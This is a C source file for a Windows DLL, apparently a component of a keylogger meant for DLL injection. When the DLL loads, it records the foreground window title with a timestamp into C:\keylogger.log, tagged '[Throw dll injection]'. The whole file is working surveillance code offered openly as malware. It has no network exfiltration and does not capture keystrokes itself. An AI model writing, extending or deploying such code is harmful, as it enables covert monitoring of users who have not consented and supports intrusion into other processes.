#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>

char foregroundWindowTitle[4096];

VOID Mylog(void *toMyLog, int MODE, BOOL putDate);
VOID GetWindowTitle(HWND hwnd)
{
    if (hwnd == NULL)
    {
        strcpy_s(foregroundWindowTitle, 4096, "[GetWinTitle Failed]");
        Mylog(foregroundWindowTitle, 0, TRUE);
        return;
    }
    int windowTitleLen = GetWindowTextLength(hwnd);
    if (windowTitleLen > 4095)
        windowTitleLen = 4095;
    GetWindowTextA(hwnd, foregroundWindowTitle, windowTitleLen + 1);
    Mylog(foregroundWindowTitle, 0, TRUE);
}

VOID Mylog(void *toMyLog, int MODE, BOOL putDate)
{
    FILE *f = fopen("C:\\keylogger.log", "a+");
    if (putDate)
    {
        SYSTEMTIME lt;    
        GetLocalTime(&lt);
        fprintf(f, "\n[Throw dll injection][%02d/%02d/%d %02d:%02d:%02d]", lt.wDay, lt.wMonth, lt.wYear, lt.wHour, lt.wMinute, lt.wSecond);
    }
    fprintf(f, "[%s]\n", foregroundWindowTitle);
    fclose(f);
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        GetWindowTitle(GetForegroundWindow());
    }
    return TRUE;
}